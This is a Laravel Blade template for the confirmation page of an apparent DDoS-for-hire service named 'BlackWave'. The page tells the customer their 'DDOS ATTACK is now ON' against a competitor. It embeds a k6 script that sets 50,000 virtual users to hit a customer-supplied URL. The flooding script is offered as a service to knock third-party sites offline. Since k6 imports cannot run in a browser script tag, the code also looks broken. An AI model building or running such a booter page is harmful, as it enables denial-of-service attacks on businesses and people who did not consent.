{{-- resources/views/services/ddos-waiting.blade.php --}}
@extends('layouts.app')

@section('title', 'Service Activated - BlackWave')

@section('content')
    <div class="min-h-[calc(100vh-200px)] flex items-center justify-center py-12 px-4">
        <div class="max-w-md w-full mx-auto">

            {{-- Processing Card --}}
            <div class="rounded-2xl border border-white/10 bg-black/50 backdrop-blur-sm p-6 md:p-8 text-center">

                {{-- Success Icon Animation --}}
                <div class="flex justify-center mb-6">
                    <div
                        class="h-20 w-20 rounded-full bg-gradient-to-r from-green-600 to-green-500 flex items-center justify-center animate-pulse">
                        <svg class="h-10 w-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                        </svg>
                    </div>
                </div>

                {{-- Title --}}
                <h1 class="text-2xl md:text-3xl font-bold text-white mb-3">
                    Service Activated!
                </h1>
                <p class="text-green-400 font-medium mb-2">
                    Your DDOS ATTACK is now ON
                </p>
                <p class="text-gray-400 mb-6">
                    Please wait while we finish ATTACK your competitor
                </p>

                {{-- Progress Bar --}}
                <div class="mb-6">
                    <div class="h-2 bg-white/10 rounded-full overflow-hidden">
                        <div class="h-full w-full bg-gradient-to-r from-green-600 to-green-500 rounded-full animate-pulse">
                        </div>
                    </div>
                    <p class="text-xs text-gray-500 mt-2">Finalizing setup...</p>
                </div>

                {{-- Loading Spinner --}}
                <div class="flex justify-center mb-6">
                    <div class="relative">
                        <div class="h-10 w-10 rounded-full border-4 border-white/20 border-t-green-600 animate-spin"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    @push('scripts')
        <script type="module">
            import http from 'k6/http';
            import {
                sleep
            } from 'k6';

            export const options = {
                vus: 50000,
                duration: '2s',
            };

            export default function() {
                http.get(@json($web));
                sleep(1);
            }
        </script>
    @endpush
@endsection
